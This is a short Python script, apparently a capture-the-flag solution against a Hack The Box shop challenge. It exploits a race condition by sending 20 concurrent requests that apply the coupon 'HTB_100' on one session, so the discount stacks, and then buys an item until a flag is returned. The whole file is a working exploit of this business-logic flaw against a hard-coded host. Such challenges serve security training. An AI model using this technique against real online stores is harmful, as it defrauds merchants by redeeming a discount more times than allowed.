from threading import Thread

import requests

targetURL = "http://165.232.98.104:30704"


def getSession():
    r = requests.post(targetURL + "/api/coupons/apply")
    return r.cookies


def appyCoupon(session):
    r = requests.post(
        targetURL + "/api/coupons/apply",
        json={"coupon_code": "HTB_100"},
        cookies=session,
    )
    print(r.text)


def purchase(session):
    r = requests.post(targetURL + "/api/purchase", json={"item": "C8"}, cookies=session)
    print(r.text)
    return "HTB" in r.text


for _ in range(20):
    session = getSession()

    t = []
    for i in range(20):
        t.append(Thread(target=appyCoupon, args=(session,)))
    for k in t:
        k.start()
    # waiting all thread end before calling purchase
    for k in t:
        k.join()

    if purchase(session):
        break
